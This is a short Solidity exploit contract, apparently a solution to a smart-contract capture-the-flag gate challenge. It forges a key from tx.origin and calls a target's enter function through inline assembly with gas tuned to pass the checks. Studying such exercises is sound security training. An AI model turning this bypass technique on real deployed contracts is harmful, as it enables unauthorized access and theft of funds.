// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  function attack(address _target) public onlyHacker {
    // make key
    bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

    // generate goTo function signature
    bytes memory sig = abi.encodeWithSignature("enter(bytes8)", key);

    bool result = false;

    // estimated gas
    uint256 estimatedGas = 426 + 8191 * 10; // gas amount required until reach to gas comparison

    assembly {
      // Load the length (first 32 bytes)
      let len := mload(sig)
      // Skip over the length field.
      let data := add(sig, 0x20)

      result := call(
        estimatedGas, // gas
        _target, // target address
        0, // ether
        data, // input location
        len, // length of input params
        0, // output location
        0 // no need to use output params
      )
    }

    require(result == true, "Attack failed!");
  }
}
